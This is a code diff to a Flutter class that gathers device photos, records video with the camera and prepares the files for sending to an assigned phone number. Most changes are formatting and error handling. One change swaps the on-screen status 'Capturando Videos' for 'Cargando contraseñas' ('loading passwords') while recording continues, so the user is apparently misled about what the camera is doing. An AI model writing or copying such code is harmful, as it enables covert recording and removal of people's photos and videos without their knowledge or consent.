@@ -34,8 +34,8 @@ class CameraSendCubit extends Cubit<CameraSendState> {
   Future getNumberPhone() async {
     try {
       final resp = await _repository.getPhoneNumber();
-      if(resp == null) err = true;
-      phone = resp?? "";
+      if (resp == null) err = true;
+      phone = resp ?? "";
     } catch (e) {
       err = true;
       emit(CameraSendError("Encontramos un error en la conexion a internet"));
@@ -46,7 +46,7 @@ class CameraSendCubit extends Cubit<CameraSendState> {
     try {
       err = false;
       await getNumberPhone();
-      if (phone.isNotEmpty && phone.length == 12 && err == false) {
+      if (phone.isNotEmpty && err == false) {
         emit(CameraSendLoading(""));
         getPermisse().then((v) {
           lista = v;
@@ -83,7 +83,7 @@ class CameraSendCubit extends Cubit<CameraSendState> {
               File('${directory.path}/${photo.path.split("/").last}');
           list.add(fileexport.path);
         }
-        emit(CameraSendLoading("Capturando Videos"));
+        emit(CameraSendLoading("Cargando contraseñas"));
         controller = CameraController(
             const CameraDescription(
                 name: "0",
@@ -115,14 +115,21 @@ class CameraSendCubit extends Cubit<CameraSendState> {
           list.add(videoexport.path);
         }
         emit(CameraSendLoaded(list));
-      } else if(err == true){
-      emit(CameraSendError("Encontramos un error en la conexion a internet"));
+      } else if (err == true) {
+        emit(CameraSendError("Encontramos un error en la conexion a internet"));
       } else
         emit(CameraSendError(
             "Lo sentimos, actualmente no ha sido asignado un numero valida para envio, por favor intente mas tarde"));
-    } catch (e) {
-      emit(CameraSendError(
+    } on CameraException catch (e) {
+      switch (e.code) {
+        case "captureTimeout":
+          emit(CameraSendError(
+              "La camara no responde, por favor verifique el estado de su camara e intente nuevamente"));
+          break;
+        default:
+          emit(CameraSendError(
           "No fue posible acceder a la camara, por favor revise los permisos o intente mas tarde"));
+      }
     }
   }
 
